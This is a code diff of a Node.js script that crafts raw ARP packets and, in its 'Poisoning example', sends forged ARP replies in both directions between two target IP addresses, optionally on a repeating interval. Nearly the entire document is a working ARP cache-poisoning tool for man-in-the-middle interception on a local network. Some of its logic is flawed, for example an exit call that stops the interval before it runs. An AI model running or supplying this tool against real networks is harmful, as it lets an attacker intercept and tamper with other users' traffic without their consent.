@@ -1,74 +1,78 @@
+"use strict";
+
 var Cap = require('cap').Cap,
-    c = new Cap(),
-	ip = require("ip"),
-    device = Cap.findDevice(ip.address()),
-	getmac = require('getmac').getMac,
-    filter = 'arp',
-    bufSize = 10 * 1024 * 1024,
-    socketBuffer = new Buffer(65535),
-	OPERATION = { 
-	  REQUEST:  1,
-	  REPLY: 2
-	};
+  c = new Cap(),
+  ip = require("ip"),
+  timers = require("timers"),
+  device = Cap.findDevice(ip.address()),
+  getmac = require('getmac').getMac,
+  filter = 'arp',
+  bufSize = 10 * 1024 * 1024,
+  socketBuffer = new Buffer(65535),
+  OPERATION = {
+    REQUEST:  1,
+    REPLY: 2
+  };
 
 var linkType = c.open(device, filter, bufSize, socketBuffer);
 
-var target1 = null, target2 = null;
-		
-if(process.argv.length < 4) {
-} else {
-  target1 = process.argv[2]
-  target2 = process.argv[3]
-  
+var target1 = null, target2 = null, interval = null;
+
+if(process.argv.length > 1) {
+  target1 = process.argv[2];
+  target2 = process.argv[3];
+  if(typeof process.argv[4] !== "undefined") {
+    interval = process.argv[4];
+  }
 }
 
 getmac(function(err, macAddr) {
-  var packet = createARPPacket();
-  
   // Request example  
   /*packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-  packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-  
-  setMac(packet.eth.src_mac, macAddr)
-  setMac(packet.arp.src_mac, macAddr)
-  
-  setIP(packet.arp.src_ip, "192.168.1.12")
-  setIP(packet.arp.dst_ip, "192.168.1.1")
-  
-  send(packet.buffer)*/
-  
+   packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
+
+   setMac(packet.eth.src_mac, macAddr)
+   setMac(packet.arp.src_mac, macAddr)
+
+   setIP(packet.arp.src_ip, "192.168.1.12")
+   setIP(packet.arp.dst_ip, "192.168.1.1")
+
+   send(packet.buffer)*/
+
   // Poisoning example
   if(target1 !== null && target2 !== null) {
-    // Send reply from target1 to broadcast, advertising new hardware address
-	packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2)
-	
-	packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-    packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-	
-	setMac(packet.arp.src_mac, macAddr);
-	setMac(packet.eth.src_mac, macAddr);
-	
-    setIP(packet.arp.src_ip, target1);
-	setIP(packet.arp.dst_ip, target2);
-	
-	send(packet.buffer);
-	
-	// Send reply from target2 to broadcast, advertising new hardware address
-    packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2)
-	
-	packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-    packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
-	
-	setMac(packet.arp.src_mac, macAddr);
-	setMac(packet.eth.src_mac, macAddr);
-	
-    setIP(packet.arp.src_ip, target2);
-	setIP(packet.arp.dst_ip, target1);
-	
-	send(packet.buffer);
+    if(interval !== null) {
+      console.log("Starting interval");
+      setInterval(spoofBothWays, interval, target1, target2, macAddr);
+    }
+    spoofBothWays(target1, target2, macAddr);
   }
-  
+
+  process.exit();
 });
+
+var spoofBothWays = (target1, target2, mac) => {
+  spoof(target1, target2, mac);
+  spoof(target2, target1, mac);
+};
+
+var spoof = (target1, target2, mac) => {
+// Send reply from target1 to broadcast, advertising new hardware address
+  var packet = createARPPacket();
+
+  packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);
+
+  packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);
+  packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);
+
+  setMac(packet.arp.src_mac, mac);
+  setMac(packet.eth.src_mac, mac);
+
+  setIP(packet.arp.src_ip, target1);
+  setIP(packet.arp.dst_ip, target2);
+
+  send(packet.buffer);
+};
 
 var send = (buffer) => {
   try {
@@ -77,25 +81,25 @@ var send = (buffer) => {
   } catch (e) {
     console.log("Error sending packet:", e);
   }
-}
+};
 
 var setMac = (buffer, addr) => {
   // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
-  var mac = parseInt(addr.split("-").join(""), 16)
+  var mac = parseInt(addr.split("-").join(""), 16);
   buffer.writeUIntBE(mac, 0, 6);
-}
+};
 
 var setIP = (buffer, ip) => {
   var ip_blocks = ip.split(".");
   for(var i = 0; i < ip_blocks.length; i++) {
-    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1)
+    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1);
   }
-}
+};
 
 var createARPPacket = (buf) => {
   var buffer = buf;
-  if(typeof buffer == "undefined") {
-    var buffer = new Buffer([
+  if(typeof buffer === "undefined") {
+    buffer = new Buffer([
       // ETHERNET
       0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
       0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
@@ -111,12 +115,12 @@ var createARPPacket = (buf) => {
       0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
     ]);
   }
-  
+
   var packet = {
     eth: {
-   	  dst_mac: buffer.slice(0,6),
-	  src_mac: buffer.slice(6,12),
-	  ethertype: buffer.slice(12,14)
+      dst_mac: buffer.slice(0,6),
+      src_mac: buffer.slice(6,12),
+      ethertype: buffer.slice(12,14)
     },
     arp: {
       hardwareType: buffer.slice(14,16),
@@ -128,10 +132,10 @@ var createARPPacket = (buf) => {
       dst_mac: buffer.slice(32,38),
       dst_ip: buffer.slice(38,42)
     }
-  }
+  };
 
   packet.buffer = buffer;
-  
+
   return packet;
-}
+};
   
